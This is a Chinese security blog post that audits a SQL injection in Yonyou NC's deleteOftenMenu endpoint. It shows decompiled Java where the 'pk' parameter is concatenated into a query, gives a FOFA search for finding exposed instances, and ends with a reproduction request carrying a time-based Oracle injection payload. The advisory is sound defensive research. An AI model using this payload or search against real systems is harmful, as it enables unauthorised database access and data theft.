---
title: "用友NC deleteOftenMenu SQL注入漏洞"
source: https://mrxn.net/jswz/yonyou-nc-deleteMenu-deleteOftenMenu-pk-sqli.html
asset_dir: assets/用友nc-deleteoftenmenu-sql注入漏洞
---

# 用友NC deleteOftenMenu SQL注入漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/2/11 18:49
- 733浏览
- [0评论](#comment)
- 1小时阅读

深入探索

软件

客户关系管理

数据库管理系统

---

# 漏洞简介

[用友](https://mrxn.net/tag/%E7%94%A8%E5%8F%8B "用友")NC系统可利用deleteOftenMenu传入的参数实现SQL注入，从而窃取服务器的敏感信息。

SQL注入防护

# 影响版本

NC63、NC633、NC65

# fofa语法

> `app="用友-UFIDA-NC"`

# 漏洞分析

本来是根据官方[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E "漏洞")通告可知 deleteOftenMenu 为注入点

[![用友NC deleteOftenMenu SQL注入漏洞](images/img-001-33de702a30ae.webp)](https://image.mrxn.net/74c4f99bcce44aa5a1fa6f08230c9f20.webp)

因此搜索 deleteOftenMenu 方法的实现部分即可定位业务逻辑实现代码

代码安全审计

```
package nc.uap.portal.action;

import java.util.Map;
import nc.uap.lfw.core.LfwRuntimeEnvironment;
import nc.uap.lfw.core.crud.CRUDHelper;
import nc.uap.lfw.core.data.PaginationInfo;
import nc.uap.lfw.core.exception.LfwBusinessException;
import nc.uap.lfw.core.exception.LfwRuntimeException;
import nc.uap.lfw.core.log.LfwLogger;
import nc.uap.lfw.servletplus.annotation.Action;
import nc.uap.lfw.servletplus.annotation.Servlet;
import nc.uap.lfw.servletplus.core.impl.BaseAction;
import nc.uap.lfw.util.LanguageUtil;
import nc.uap.portal.vo.PtRegularItemVO;
import nc.vo.ml.NCLangRes4VoTransl;
import uap.lfw.core.ml.LfwResBundle;

@Servlet(
    path = "/deleteMenu"
)
public class DeleteOftenMenuAction extends BaseAction {
    public DeleteOftenMenuAction() {
    }

    @Action
    public void deleteOftenMenu() {
        String pk = this.request.getParameter("pk");
        String pk_user = LfwRuntimeEnvironment.getLfwSessionBean().getPk_user();

        try {
            PtRegularItemVO[] vos = (PtRegularItemVO[])CRUDHelper.getCRUDService().queryVOs("pk_user='" + pk_user + "' and pk_funcnode='" + pk + "'", PtRegularItemVO.class, (PaginationInfo)null, (String)null, (Map)null);
            String res = "";
            StringBuffer jstip = new StringBuffer();
            if (vos != null && vos.length > 0) {
                CRUDHelper.getCRUDService().deleteVo(vos[0]);
                res = LfwResBundle.getInstance().getStrByID("pmng", "MainViewController-000014");
                jstip.append("if(parent){parent.modRegMenu('" + pk + "');parent.showMessageDialog('").append(res).append("');}");
            } else {
                res = LanguageUtil.getString("pserver", "DeleteOftenMenuAction-000002");
                jstip.append("if(parent)parent.showMessageDialog('").append(res).append("');");
            }

            this.addExecScript(jstip.toString());
        } catch (LfwBusinessException e) {
            LfwLogger.error(e.getMessage(), e);
            throw new LfwRuntimeException(NCLangRes4VoTransl.getNCLangRes().getStrByID("pserver", "DeleteOftenMenuAction-000000"), e);
        }
    }
}
```

深入探索

安全

编码转换工具

漏洞扫描器

pk 直接拼接进SQL语句后，带入 queryVOs 函数，其实现逻辑如下

漏洞预警服务

```
public <M extends SuperVO> M[] queryVOs(String sql, Class<M> clazz, PaginationInfo pg, String orderBy, Map<String, Object> extMap) throws LfwBusinessException {
        return (M[])(((ILfwQueryService)ServiceLocator.getService(ILfwQueryService.class)).queryVOs(sql, clazz, pg, orderBy, extMap));
    }
public <T extends SuperVO> T[] queryVOs(String sql, Class<T> clazz, PaginationInfo pg, String orderBy, Map<String, Object> extMap) throws LfwBusinessException {
        ResultSetProcessor rp = null;
        PersistenceManager pm = null;

        SuperVO vo;
        try {
            pm = PersistenceManager.getInstance();
            JdbcSession ses = pm.getJdbcSession();
            if (!sql.trim().toLowerCase().startsWith("select ")) {
                vo = (SuperVO)LfwClassUtil.newInstance(clazz);
                String table = vo.getTableName();
                if (sql.indexOf(".") != -1) {
                    String prez = sql.substring(0, sql.indexOf("."));
                    table = table + " " + prez;
                }

                Map<String, Integer> types = this.getColmnTypes(vo.getTableName(), ses);
                sql = SQLHelper.getSelectSQL(table, this.getTableFields(vo, types)) + " " + "where" + " " + sql;
            }

            ResultSetProcessor var17 = new BeanListProcessor(clazz);
            vo = this.queryVOByPinfo(ses, sql, orderBy, (SQLParameter)null, pg, clazz, pm, var17);
        } catch (DbException e) {
            Logger.error(e.getMessage(), e);
            throw new LfwBusinessException(e.getMessage());
        } finally {
            if (pm != null) {
                pm.release();
            }

        }

        return (T[])vo;
    }
```

经过 getSelectSQL 处理带入 queryVOByPinfo，getSelectSQL 实现如下

计算机服务器

```
public static String getSelectSQL(String tableName, String[] fields) {
        StringBuffer sql = new StringBuffer();
        if (fields == null) {
            sql.append("SELECT * FROM " + tableName);
        } else {
            sql.append("SELECT ");

            for(int i = 0; i < fields.length; ++i) {
                sql.append(fields[i] + ",");
            }

            sql.setLength(sql.length() - 1);
            sql.append(" FROM " + tableName);
        }

        return sql.toString();
    }
```

queryVOByPinfo 实现如下

搜索引擎

```
private <T extends SuperVO> T[] queryVOByPinfo(JdbcSession ses, String sql, String orderByPart, SQLParameter param, PaginationInfo pg, Class voclass, PersistenceManager pm, ResultSetProcessor rp) throws DbException {
    StringBuffer tempSql = new StringBuffer(sql);
    if (pg != null && pg.getPageSize() != -1) {
        if (pg.isRecalc()) {
            String countSql = this.getCountSql(sql);
            Map obj = (Map)ses.executeQuery(countSql, param, new MapProcessor());
            int recordsCount = (Integer)obj.get("c");
            pg.setRecordsCount(recordsCount);
        }

        int index = pg.getPageIndex();
        int lastPage = pg.getPageCount() - 1;
        if (index > lastPage) {
            if (!pg.isProcessLastpage()) {
                List<T> temp = new ArrayList(0);
                return (T[])(temp.toArray((SuperVO[])Array.newInstance(voclass, 0)));
            }

            index = lastPage;
            pg.setPageIndex(lastPage);
        }

        if (orderByPart != null && !"".equals(orderByPart)) {
            if (!orderByPart.trim().toLowerCase().startsWith("order ")) {
                tempSql.append(" order by ");
            }

            tempSql.append(" ").append(orderByPart);
        }

        LimitSQLBuilder builder = SQLBuilderFactory.getInstance().createLimitSQLBuilder(pm.getDBType());
        int pageSize = pg.getPageSize();
        sql = builder.build(tempSql.toString(), index + 1, pageSize);
        Object list = ses.executeQuery(sql, param, rp);
        return (T[])(((List)list).toArray(Array.newInstance(voclass, 0)));
    } else {
        if (orderByPart != null && !"".equals(orderByPart)) {
            if (!orderByPart.trim().toLowerCase().startsWith("order ")) {
                tempSql.append(" order by ");
            }

            tempSql.append(" ").append(orderByPart);
        }

        Object list = ses.executeQuery(tempSql.toString(), param, rp);
        return (T[])(((List)list).toArray(Array.newInstance(voclass, 0)));
    }
}
```

最终调用 executeQuery 执行SQL语句，造成[SQL注入](https://mrxn.net/tag/sql%E6%B3%A8%E5%85%A5 "SQL注入")漏洞。

# 漏洞复现

同样因为存在 `LfwRuntimeEnvironment.getLfwSessionBean()` ，漏洞利用需要登录权限

编程

```
GET /portal/pt/deleteMenu/deleteOftenMenu?pageId=login&pk=1'AND+1=dbms_pipe.receive_message('RDS', 6)-- HTTP/1.0
Host: nc65.mrxn.net
Cookie: JSESSIONID=xx.server
```

# 参考

- `https://security.yonyou.com/#/noticeInfo?id=637`

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#Java](https://mrxn.net/tag/Java)
- [#用友](https://mrxn.net/tag/%E7%94%A8%E5%8F%8B)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)
- [6.参考](#toc-6-)

  
  

![](data:image/png;base64,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)

手机扫码阅读
